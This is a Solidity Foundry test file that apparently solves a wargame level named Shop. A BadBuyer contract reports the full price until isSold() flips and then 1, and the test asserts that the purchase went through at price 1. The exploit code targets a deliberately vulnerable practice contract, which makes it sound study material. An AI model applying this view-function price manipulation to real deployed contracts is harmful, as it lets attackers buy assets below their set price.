// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/21_Shop.sol";


contract BadBuyer {
  Shop target;

  constructor (address _target){
    target = Shop(_target);
  }

  function price () external view returns (uint256){
    if(target.isSold()){
      return 1;
    }else{
      return target.price();
    }
  }

  function attack ()public{
    target.buy();
  }
}
contract ShopTest is Test {
    BadBuyer badBuyer;
    Shop shop;
    address hacker = address(0x1337);
    function setUp() public {
       shop = new Shop();
       badBuyer = new BadBuyer(address(shop));
       vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        badBuyer.attack();
        assertEq(shop.price(), 1);
        vm.stopPrank();
    }
}
